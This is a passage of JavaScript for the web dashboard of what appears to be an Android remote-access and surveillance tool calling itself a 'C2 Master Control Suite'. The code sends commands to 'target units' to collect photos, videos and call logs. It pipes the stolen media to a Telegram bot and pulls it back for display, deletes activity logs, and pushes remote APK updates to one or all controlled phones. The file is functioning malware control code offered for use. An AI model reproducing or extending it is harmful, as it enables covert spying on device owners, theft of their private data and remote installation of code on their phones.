    window.requestPhotosRefresh = function () {
        sendDeviceCommand("collect_photos", "Photo collection triggered on target unit.");
    };

    window.requestVideosRefresh = function () {
        sendDeviceCommand("collect_videos", "Video collection triggered on target unit.");
    };

    // Video Lightbox Modal
    window.openVideoLightbox = function (videoUrl, timestamp) {
        const modal = document.getElementById("videoLightboxModal");
        const video = document.getElementById("lightboxVideo");
        const ts = document.getElementById("lightboxVideoTimestamp");
        const dl = document.getElementById("lightboxVideoDownloadBtn");

        if (!modal || !video) return;
        video.src = videoUrl;
        if (ts) ts.innerHTML = `<i class="fa-regular fa-clock"></i> ${timestamp || "Video Capture"}`;
        if (dl) dl.href = videoUrl;
        modal.classList.add("active");
    };

    window.closeVideoLightbox = function (event) {
        if (!event || event.target.id === "videoLightboxModal" || event.target.closest(".lightbox-close-btn")) {
            const modal = document.getElementById("videoLightboxModal");
            const video = document.getElementById("lightboxVideo");
            if (video) {
                video.pause();
                video.src = "";
            }
            if (modal) modal.classList.remove("active");
        }
    };

    // ============================================================
    // TAB 6: TELEGRAM BOT HUB & MEDIA STREAM
    // ============================================================
    let telegramBotToken = localStorage.getItem("c2_tg_token") || "";
    let telegramChatId = localStorage.getItem("c2_tg_chat_id") || "";
    let telegramMediaItems = [];
    let activeTgFilter = "all";

    // Load credentials from Firebase or localStorage on start
    database.ref("config/telegram").once("value", (snap) => {
        const cfg = snap.val();
        if (cfg) {
            if (cfg.token && !telegramBotToken) telegramBotToken = cfg.token;
            if (cfg.chat_id && !telegramChatId) telegramChatId = cfg.chat_id;
        }
        populateTelegramInputs();
    });

    function populateTelegramInputs() {
        const tokenInput = document.getElementById("telegramBotToken");
        const chatInput = document.getElementById("telegramChatId");
        if (tokenInput && telegramBotToken) tokenInput.value = telegramBotToken;
        if (chatInput && telegramChatId) chatInput.value = telegramChatId;
        updateTelegramBotStatusChip();
    }

    function updateTelegramBotStatusChip() {
        const chip = document.getElementById("telegramBotStatusChip");
        if (!chip) return;

        if (telegramBotToken && telegramChatId) {
            chip.className = "status-chip online";
            chip.innerHTML = '<i class="fa-solid fa-circle"></i> <span>Bot Configured</span>';
        } else {
            chip.className = "status-chip offline";
            chip.innerHTML = '<i class="fa-solid fa-circle"></i> <span>Not Configured</span>';
        }
    }

    window.toggleTelegramTokenVisibility = function () {
        const tokenInput = document.getElementById("telegramBotToken");
        const eye = document.getElementById("tgTokenEye");
        if (!tokenInput) return;
        const isPassword = tokenInput.type === "password";
        tokenInput.type = isPassword ? "text" : "password";
        if (eye) eye.className = isPassword ? "fa-regular fa-eye-slash" : "fa-regular fa-eye";
    };

    window.saveTelegramConfig = function () {
        const token = (document.getElementById("telegramBotToken")?.value || "").trim();
        const chatId = (document.getElementById("telegramChatId")?.value || "").trim();

        if (!token || !chatId) {
            showToast("Please enter both Bot Token and Chat ID", "warning");
            return;
        }

        telegramBotToken = token;
        telegramChatId = chatId;
        localStorage.setItem("c2_tg_token", token);
        localStorage.setItem("c2_tg_chat_id", chatId);

        // Save to Firebase RTDB for cloud sync
        database.ref("config/telegram").set({
            token: token,
            chat_id: chatId,
            updated_at: Date.now()
        }).then(() => {
            showToast("Telegram Bot credentials saved!", "success");
            updateTelegramBotStatusChip();
            // Test connection
            fetch(`https://api.telegram.org/bot${token}/getMe`)
                .then(res => res.json())
                .then(data => {
                    if (data.ok) {
                        showToast(`Connected to Bot: @${data.result.username}`);
                    } else {
                        showToast(`Bot token warning: ${data.description}`, "warning");
                    }
                })
                .catch(err => console.warn("TG check error:", err));
        }).catch(err => {
            showToast(`Save error: ${err.message}`, "error");
        });
    };

    window.testTelegramBotAlert = function () {
        const token = telegramBotToken || (document.getElementById("telegramBotToken")?.value || "").trim();
        const chatId = telegramChatId || (document.getElementById("telegramChatId")?.value || "").trim();

        if (!token || !chatId) {
            showToast("Please configure Bot Token and Chat ID first!", "warning");
            return;
        }

        showToast("Sending test dispatch to Telegram...", "info");
        const text = encodeURIComponent("🚨 *C2 Master Control Suite*\n\n✅ Telegram Bot successfully linked with admin console!\n\nDevice: " + (currentDeviceId || "General"));

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`)
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    showToast("Test notification delivered to Telegram!", "success");
                } else {
                    showToast(`Telegram Error: ${data.description}`, "error");
                }
            })
            .catch(err => {
                showToast(`Request failed: ${err.message}`, "error");
            });
    };

    window.triggerDeviceTelegramPhotos = function () {
        sendDeviceCommand("collect_photos", "Photos dispatch command sent to phone (dumping to Telegram).");
    };

    window.triggerDeviceTelegramVideos = function () {
        sendDeviceCommand("collect_videos", "Videos dispatch command sent to phone (dumping to Telegram).");
    };

    window.syncTelegramBotMedia = async function () {
        const token = telegramBotToken || (document.getElementById("telegramBotToken")?.value || "").trim();
        if (!token) {
            showToast("Please configure Bot Token first!", "warning");
            return;
        }

        const grid = document.getElementById("telegramMediaGrid");
        const countText = document.getElementById("tgMediaCountText");
        if (grid) {
            grid.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-spinner fa-spin text-cyan"></i>
                    <p>Polling Telegram Bot API for photos & video updates...</p>
                </div>
            `;
        }

        try {
            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=100`);
            const data = await res.json();

            if (!data.ok) {
                throw new Error(data.description || "Failed to fetch updates");
            }

            const updates = data.result || [];
            telegramMediaItems = [];

            for (const upd of updates) {
                const msg = upd.message || upd.channel_post;
                if (!msg) continue;

                const date = msg.date ? new Date(msg.date * 1000).toLocaleString() : "Recent";
                const caption = msg.caption || "";

                // Check for Photo
                if (msg.photo && msg.photo.length > 0) {
                    const bestPhoto = msg.photo[msg.photo.length - 1];
                    try {
                        const fileRes = await fetch(`https://api.telegram.org/bot${token}/getFile?file_id=${bestPhoto.file_id}`);
                        const fileData = await fileRes.json();
                        if (fileData.ok) {
                            telegramMediaItems.push({
                                type: "photo",
                                url: `https://api.telegram.org/file/bot${token}/${fileData.result.file_path}`,
                                timestamp: date,
                                caption: caption || "Telegram Photo",
                                fileId: bestPhoto.file_id
                            });
                        }
                    } catch (e) {
                        console.warn("Error getting photo file:", e);
                    }
                }

                // Check for Video
                if (msg.video) {
                    try {
                        const fileRes = await fetch(`https://api.telegram.org/bot${token}/getFile?file_id=${msg.video.file_id}`);
                        const fileData = await fileRes.json();
                        if (fileData.ok) {
                            telegramMediaItems.push({
                                type: "video",
                                url: `https://api.telegram.org/file/bot${token}/${fileData.result.file_path}`,
                                timestamp: date,
                                caption: caption || "Telegram Video",
                                fileId: msg.video.file_id
                            });
                        }
                    } catch (e) {
                        console.warn("Error getting video file:", e);
                    }
                }
            }

            // Also merge any deviceData.videos or deviceData.telegram_media from Firebase
            if (deviceData) {
                const fbVideos = deviceData.videos || {};
                Object.keys(fbVideos).forEach(k => {
                    const item = fbVideos[k];
                    const url = typeof item === "string" ? item : (item.url || item.path || "");
                    const ts = item.timestamp ? new Date(parseInt(item.timestamp)).toLocaleString() : "Device Video";
                    if (url) {
                        telegramMediaItems.push({
                            type: "video",
                            url: url,
                            timestamp: ts,
                            caption: item.name || "Device Recorded Video",
                            fileId: k
                        });
                    }
                });
            }

            // Sort newest first
            telegramMediaItems.reverse();

            renderTelegramMediaGrid();
            if (countText) countText.textContent = `${telegramMediaItems.length} items synced from Telegram & Cloud`;
            showToast(`Synced ${telegramMediaItems.length} media items from Telegram!`);

        } catch (err) {
            showToast(`Telegram Sync Error: ${err.message}`, "error");
            if (grid) {
                grid.innerHTML = `
                    <div class="empty-panel-prompt">
                        <i class="fa-solid fa-triangle-exclamation text-rose"></i>
                        <p>Sync failed: ${escapeHTML(err.message)}</p>
                    </div>
                `;
            }
        }
    };

    function renderTelegramMediaTab() {
        populateTelegramInputs();
        renderTelegramMediaGrid();
    }

    function renderTelegramMediaGrid() {
        const grid = document.getElementById("telegramMediaGrid");
        const badge = document.getElementById("badgeTelegram");
        if (!grid) return;

        if (badge) {
            badge.textContent = telegramMediaItems.length > 0 ? `${telegramMediaItems.length}` : "Bot";
        }

        if (telegramMediaItems.length === 0) {
            grid.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-brands fa-telegram text-cyan"></i>
                    <p>No Telegram media fetched yet. Click 'Sync Bot Media' above to pull photos & videos.</p>
                </div>
            `;
            return;
        }

        const filtered = telegramMediaItems.filter(item => {
            if (activeTgFilter === "photos" && item.type !== "photo") return false;
            if (activeTgFilter === "videos" && item.type !== "video") return false;
            return true;
        });

        if (filtered.length === 0) {
            grid.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-filter"></i>
                    <p>No media matching filter '${activeTgFilter}'.</p>
                </div>
            `;
            return;
        }

        grid.innerHTML = "";
        filtered.forEach((item, idx) => {
            const card = document.createElement("div");
            card.className = "media-item-card";

            const isVideo = item.type === "video";
            const badgeIcon = isVideo ? "fa-video text-cyan" : "fa-camera text-emerald";
            const badgeText = isVideo ? "VIDEO" : "PHOTO";

            if (isVideo) {
                card.innerHTML = `
                    <span class="media-type-badge"><i class="fa-solid ${badgeIcon}"></i> ${badgeText}</span>
                    <video src="${escapeHTML(item.url)}" preload="metadata"></video>
                    <div class="video-play-overlay-icon">
                        <i class="fa-solid fa-play"></i>
                    </div>
                    <div class="photo-card-overlay">
                        <span class="photo-date-text">${escapeHTML(item.timestamp)}</span>
                        <div class="photo-action-buttons">
                            <button class="btn-photo-action" title="Play Video" onclick="event.stopPropagation(); openVideoLightbox('${escapeHTML(item.url)}', '${escapeHTML(item.timestamp)}')">
                                <i class="fa-solid fa-play"></i>
                            </button>
                            <a href="${escapeHTML(item.url)}" download="video_${idx}.mp4" target="_blank" class="btn-photo-action" title="Download Video" onclick="event.stopPropagation();">
                                <i class="fa-solid fa-download"></i>
                            </a>
                        </div>
                    </div>
                `;
                card.onclick = () => openVideoLightbox(item.url, item.timestamp);
            } else {
                card.innerHTML = `
                    <span class="media-type-badge"><i class="fa-solid ${badgeIcon}"></i> ${badgeText}</span>
                    <img src="${escapeHTML(item.url)}" alt="Telegram Photo" loading="lazy">
                    <div class="photo-card-overlay">
                        <span class="photo-date-text">${escapeHTML(item.timestamp)}</span>
                        <div class="photo-action-buttons">
                            <button class="btn-photo-action" title="View Fullscreen" onclick="openPhotoLightbox('${escapeHTML(item.url)}', '${escapeHTML(item.timestamp)}')">
                                <i class="fa-solid fa-expand"></i>
                            </button>
                            <a href="${escapeHTML(item.url)}" download="telegram_photo_${idx}.jpg" target="_blank" class="btn-photo-action" title="Download Image">
                                <i class="fa-solid fa-download"></i>
                            </a>
                        </div>
                    </div>
                `;
            }

            grid.appendChild(card);
        });
    }

    window.filterTelegramMedia = function (filter) {
        activeTgFilter = filter;
        document.querySelectorAll("[data-tgfilter]").forEach(chip => {
            chip.classList.toggle("active", chip.dataset.tgfilter === filter);
        });
        renderTelegramMediaGrid();
    };

    // ============================================================
    // TAB 6: CALL LOGS
    // ============================================================
    function renderCallsTab() {
        const container = document.getElementById("callsContainer");
        const badge = document.getElementById("badgeCalls");
        if (!container) return;

        if (!currentDeviceId || !deviceData) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-phone-volume"></i>
                    <p>Select a device to view incoming, outgoing and missed call histories.</p>
                </div>
            `;
            if (badge) badge.textContent = "0";
            return;
        }

        const calls = deviceData.call_logs || deviceData.calls || {};
        const callKeys = Object.keys(calls);
        if (badge) badge.textContent = callKeys.length;

        if (callKeys.length === 0) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-phone-slash"></i>
                    <p>No call logs available. Click 'Fetch Call Logs' to sync records.</p>
                </div>
            `;
            return;
        }

        const query = (document.getElementById("callsSearchInput")?.value || "").toLowerCase().trim();

        const list = document.createElement("div");
        list.className = "calls-list";

        let displayed = 0;

        callKeys.forEach(key => {
            const item = calls[key];
            let number = "Unknown";
            let type = "incoming";
            let duration = "0s";
            let date = "";

            if (typeof item === "object" && item !== null) {
                number = item.number || item.phone || item.name || "Unknown";
                type = (item.type || "").toLowerCase();
                duration = item.duration ? `${item.duration}s` : "0s";
                date = item.date || item.timestamp ? new Date(parseInt(item.date || item.timestamp)).toLocaleString() : "";
            } else if (typeof item === "string") {
                number = item;
            }

            if (query && !number.toLowerCase().includes(query)) return;

            displayed++;

            let typeIcon = "fa-arrow-down-left";
            let typeClass = "incoming";
            let typeText = "Incoming";

            if (type.includes("out")) {
                typeIcon = "fa-arrow-up-right";
                typeClass = "outgoing";
                typeText = "Outgoing";
            } else if (type.includes("miss")) {
                typeIcon = "fa-phone-slash";
                typeClass = "missed";
                typeText = "Missed";
            }

            const card = document.createElement("div");
            card.className = "call-item-card";
            card.innerHTML = `
                <div class="call-meta-group">
                    <div class="call-type-icon ${typeClass}">
                        <i class="fa-solid ${typeIcon}"></i>
                    </div>
                    <div class="call-details">
                        <span class="call-number">${escapeHTML(number)}</span>
                        <span class="call-sub-info">${typeText} • Duration: ${duration} ${date ? "• " + date : ""}</span>
                    </div>
                </div>
                <button class="btn-contact-action btn-contact-delete" title="Delete Call Log" onclick="deleteSingleCallLog('${key}')">
                    <i class="fa-solid fa-trash-can"></i>
                </button>
            `;
            list.appendChild(card);
        });

        container.innerHTML = "";
        if (displayed === 0) {
            container.innerHTML = `
                <div class="empty-panel-prompt">
                    <i class="fa-solid fa-magnifying-glass"></i>
                    <p>No call logs matching search filter.</p>
                </div>
            `;
        } else {
            container.appendChild(list);
        }
    }

    window.filterCallsList = function () {
        renderCallsTab();
    };

    window.deleteSingleCallLog = function (callKey) {
        if (!currentDeviceId) return;
        database.ref(`devices/${currentDeviceId}/call_logs/${callKey}`).remove()
            .then(() => showToast("Call log deleted."))
            .catch(err => showToast(`Error: ${err.message}`, "error"));
    };

    window.confirmDeleteAllCalls = function () {
        if (!currentDeviceId) return;
        const count = Object.keys(deviceData.call_logs || {}).length;
        if (count === 0) return;

        openConfirmModal(
            "Clear Call Logs",
            `Remove all ${count} call logs from database?`,
            () => {
                database.ref(`devices/${currentDeviceId}/call_logs`).remove();
                showToast("All call records removed.");
            }
        );
    };

    window.requestCallsRefresh = function () {
        sendDeviceCommand("collect_calls", "Call logs sync command transmitted.");
    };

    // ============================================================
    // TAB 7: TERMINAL LOGS
    // ============================================================
    function renderLogsTab() {
        const terminal = document.getElementById("logsDisplay");
        if (!terminal) return;

        if (!currentDeviceId || !deviceData) {
            terminal.innerHTML = '<div class="terminal-line system">[SYSTEM] Ready. Select a unit from the left panel.</div>';
            return;
        }

        const logs = deviceData.logs || {};
        const logEntries = Object.values(logs).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

        if (logEntries.length === 0) {
            terminal.innerHTML = '<div class="terminal-line">[SYSTEM] No activity logged for this device yet.</div>';
            return;
        }

        terminal.innerHTML = "";
        logEntries.forEach(log => {
            const time = log.timestamp ? new Date(parseInt(log.timestamp)).toLocaleTimeString() : "";
            const div = document.createElement("div");
            div.className = "terminal-line";

            const msg = log.message || JSON.stringify(log);
            if (msg.includes("success") || msg.includes("OK")) div.classList.add("success");
            else if (msg.includes("error") || msg.includes("fail")) div.classList.add("error");
            else if (msg.includes("command")) div.classList.add("system");

            div.textContent = `[${time}] ${msg}`;
            terminal.appendChild(div);
        });
    }

    window.confirmDeleteDeviceLogs = function () {
        if (!currentDeviceId) return;
        openConfirmModal(
            "Clear Terminal Logs",
            "Clear all logged activity traces for this unit?",
            () => {
                database.ref(`devices/${currentDeviceId}/logs`).remove();
                showToast("Terminal logs cleared.");
            }
        );
    };

    // ============================================================
    // SUITE TAB SWITCHER & SCROLLING
    // ============================================================
    window.switchSuiteTab = function (tabName) {
        currentSuiteTab = tabName;
        document.querySelectorAll(".suite-tab").forEach(btn => {
            const isActive = btn.dataset.tab === tabName;
            btn.classList.toggle("active", isActive);
            if (isActive) {
                try {
                    btn.scrollIntoView({ behavior: 'smooth', inline: 'center', block: 'nearest' });
                } catch (e) {
                    btn.scrollIntoView(false);
                }
            }
        });
        document.querySelectorAll(".tab-panel").forEach(panel => {
            panel.classList.toggle("active", panel.id === `tab-${tabName}`);
        });

        if (tabName === "location" && map) {
            setTimeout(() => map.invalidateSize(), 150);
        }
    };

    window.scrollSuiteTabs = function (amount) {
        const list = document.getElementById("suiteTabsList");
        if (list) {
            list.scrollBy({ left: amount, behavior: "smooth" });
        }
    };

    // ============================================================
    // COMMAND EXECUTION
    // ============================================================
    window.sendQuickCommand = function () {
        const select = document.getElementById("quickCommandSelect");
        if (!select) return;
        const cmd = select.value;
        sendDeviceCommand(cmd, `Command "${cmd}" sent!`);
    };

    function sendDeviceCommand(command, successMsg) {
        const feedback = document.getElementById("commandStatusFeedback");

        if (!currentDeviceId) {
            if (feedback) feedback.textContent = "⚠️ Select a device first!";
            showToast("Select a device first!", "warning");
            return;
        }

        const cmdKey = Date.now().toString();
        database.ref(`devices/${currentDeviceId}/commands/${cmdKey}`)
            .set(command)
            .then(() => {
                if (feedback) feedback.textContent = `✅ ${command} dispatched!`;
                showToast(successMsg || `Command "${command}" sent!`, "success");
            })
            .catch(err => {
                if (feedback) feedback.textContent = `❌ Error: ${err.message}`;
                showToast(`Command failed: ${err.message}`, "error");
            });
    }

    // ============================================================
    // DEVICE DELETION
    // ============================================================
    window.confirmDeleteCurrentDevice = function () {
        if (!currentDeviceId) {
            showToast("No active device selected.", "warning");
            return;
        }
        const model = (deviceData.info && deviceData.info.model) || "Device";
        promptDeleteDevice(currentDeviceId, model);
    };

    window.promptDeleteDevice = function (deviceId, modelName) {
        openConfirmModal(
            "Delete Device",
            `DANGER: Are you sure you want to completely erase unit "${modelName}" (ID: ${deviceId.substring(0, 10)}...) and all its data from Firebase?`,
            () => {
                database.ref(`devices/${deviceId}`).remove()
                    .then(() => {
                        showToast(`Device "${modelName}" permanently deleted.`);
                        if (currentDeviceId === deviceId) {
                            currentDeviceId = null;
                            deviceData = {};
                            resetActiveDeviceView();
                        }
                    })
                    .catch(err => {
                        showToast(`Delete failed: ${err.message}`, "error");
                    });
            }
        );
    };

    // ============================================================
    // PUSH APK UPDATE LOGIC (FIREBASE STORAGE & BROADCAST)
    // ============================================================
    window.openApkUpdateModal = function () {
        const modal = document.getElementById("apkUpdateModal");
        if (modal) {
            modal.classList.add("active");
            document.getElementById("apkPushStatus").textContent = "";
            const scopeSelect = document.getElementById("apkTargetScope");
            if (scopeSelect) {
                scopeSelect.value = currentDeviceId ? "selected" : "all";
            }
        }
    };

    window.closeApkUpdateModal = function () {
        const modal = document.getElementById("apkUpdateModal");
        if (modal) modal.classList.remove("active");
        resetApkUploadUI();
    };

    window.switchApkMethod = function (method) {
        currentApkMethod = method;
        document.getElementById("btnMethodUpload").classList.toggle("active", method === "upload");
        document.getElementById("btnMethodUrl").classList.toggle("active", method === "url");
        document.getElementById("methodUploadSection").classList.toggle("active", method === "upload");
        document.getElementById("methodUrlSection").classList.toggle("active", method === "url");
    };

    // APK Drag & Drop / File selection
    const apkDropZone = document.getElementById("apkDropZone");
    const apkFileInput = document.getElementById("apkFileInput");

    if (apkDropZone && apkFileInput) {
        apkDropZone.addEventListener("click", () => apkFileInput.click());

        apkDropZone.addEventListener("dragover", (e) => {
            e.preventDefault();
            apkDropZone.classList.add("dragover");
        });

        apkDropZone.addEventListener("dragleave", () => {
            apkDropZone.classList.remove("dragover");
        });

        apkDropZone.addEventListener("drop", (e) => {
            e.preventDefault();
            apkDropZone.classList.remove("dragover");
            if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
                handleSelectedApk(e.dataTransfer.files[0]);
            }
        });

        apkFileInput.addEventListener("change", (e) => {
            if (e.target.files && e.target.files.length > 0) {
                handleSelectedApk(e.target.files[0]);
            }
        });
    }

    function handleSelectedApk(file) {
        if (!file.name.toLowerCase().endsWith(".apk")) {
            showToast("Please select a valid .apk file", "error");
            return;
        }

        selectedApkFile = file;
        const sizeMb = (file.size / (1024 * 1024)).toFixed(2);

        document.getElementById("selectedFileName").textContent = file.name;
        document.getElementById("selectedFileSize").textContent = `(${sizeMb} MB)`;
        document.getElementById("selectedFileInfo").style.display = "flex";
    }

    function resetApkUploadUI() {
        selectedApkFile = null;
        if (apkFileInput) apkFileInput.value = "";
        const fileInfo = document.getElementById("selectedFileInfo");
        if (fileInfo) fileInfo.style.display = "none";
        const progressCont = document.getElementById("uploadProgressContainer");
        if (progressCont) progressCont.style.display = "none";
        const submitBtn = document.getElementById("btnSubmitApkUpdate");
        if (submitBtn) {
            submitBtn.disabled = false;
            document.getElementById("btnSubmitApkText").textContent = "Push APK Update";
        }
    }

    window.submitApkPush = function () {
        const version = document.getElementById("apkVersionCode")?.value.trim() || "v" + Date.now();
        const notes = document.getElementById("apkReleaseNotes")?.value.trim() || "Standard System Update";
        const scope = document.getElementById("apkTargetScope")?.value || "selected";
        const statusEl = document.getElementById("apkPushStatus");
        const submitBtn = document.getElementById("btnSubmitApkUpdate");

        if (scope === "selected" && !currentDeviceId) {
            statusEl.textContent = "⚠️ Please select a target device or choose 'Broadcast to ALL'.";
            statusEl.style.color = "#f43f5e";
            return;
        }

        // METHOD 1: Local File Upload to Firebase Storage
        if (currentApkMethod === "upload") {
            if (!selectedApkFile) {
                statusEl.textContent = "⚠️ Please choose an .apk file to upload.";
                statusEl.style.color = "#f43f5e";
                return;
            }

            if (!storage) {
                statusEl.textContent = "❌ Firebase Storage not available. Switch to Direct URL method.";
                statusEl.style.color = "#f43f5e";
                return;
            }

            submitBtn.disabled = true;
            const progressCont = document.getElementById("uploadProgressContainer");
            const progressBar = document.getElementById("uploadProgressBar");
            const progressPct = document.getElementById("uploadPercentage");

            progressCont.style.display = "flex";
            statusEl.textContent = "⏳ Uploading APK binary to Firebase Storage...";
            statusEl.style.color = "#06b6d4";

            const storagePath = `apks/${Date.now()}_${selectedApkFile.name}`;
            const uploadTask = storage.ref(storagePath).put(selectedApkFile);

            uploadTask.on(
                "state_changed",
                (snapshot) => {
                    const progress = Math.round((snapshot.bytesTransferred / snapshot.totalBytes) * 100);
                    progressBar.style.width = `${progress}%`;
                    progressPct.textContent = `${progress}%`;
                },
                (error) => {
                    statusEl.textContent = `❌ Upload failed: ${error.message}`;
                    statusEl.style.color = "#f43f5e";
                    submitBtn.disabled = false;
                },
                () => {
                    uploadTask.snapshot.ref.getDownloadURL().then((downloadUrl) => {
                        statusEl.textContent = "✅ APK Uploaded! Dispatching update command...";
                        statusEl.style.color = "#10b981";
                        dispatchApkCommand(downloadUrl, version, notes, scope);
                    });
                }
            );

        // METHOD 2: Direct URL
        } else {
            const directUrl = document.getElementById("apkDirectUrl")?.value.trim();
            if (!directUrl || !directUrl.startsWith("http")) {
                statusEl.textContent = "⚠️ Enter a valid http/https download URL.";
                statusEl.style.color = "#f43f5e";
                return;
            }

            submitBtn.disabled = true;
            dispatchApkCommand(directUrl, version, notes, scope);
        }
    };

    function dispatchApkCommand(url, version, notes, scope) {
        const commandPayload = {
            action: "update_apk",
            command: "update_apk",
            url: url,
            version: version,
            notes: notes,
            timestamp: Date.now()
        };

        const cmdKey = Date.now().toString();

        let targetIds = [];
        if (scope === "selected" && currentDeviceId) {
            targetIds = [currentDeviceId];
        } else {
            targetIds = Object.keys(devices);
        }

        if (targetIds.length === 0) {
            showToast("No target devices available to push update.", "warning");
            closeApkUpdateModal();
            return;
        }

        const promises = targetIds.map(id => {
            return database.ref(`devices/${id}/commands/${cmdKey}`).set(commandPayload);
        });

        Promise.all(promises)
            .then(() => {
                showToast(`🚀 Update ${version} pushed to ${targetIds.length} device(s)!`, "success");
                closeApkUpdateModal();
            })
            .catch(err => {
                showToast(`Failed to dispatch: ${err.message}`, "error");
                const submitBtn = document.getElementById("btnSubmitApkUpdate");
                if (submitBtn) submitBtn.disabled = false;
            });
    }

} // End isDashboard

// ============================================================
// HELPER UTILITIES
// ============================================================
function escapeHTML(str) {
    if (typeof str !== "string") return str;
    return str.replace(/[&<>'"]/g, 
        tag => ({
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            "'": '&#39;',
            '"': '&quot;'
        }[tag] || tag)
    );
}

function copyText(text) {
    if (!text) return;
    navigator.clipboard.writeText(text).then(() => {
        showToast("Copied to clipboard!");
    });
}
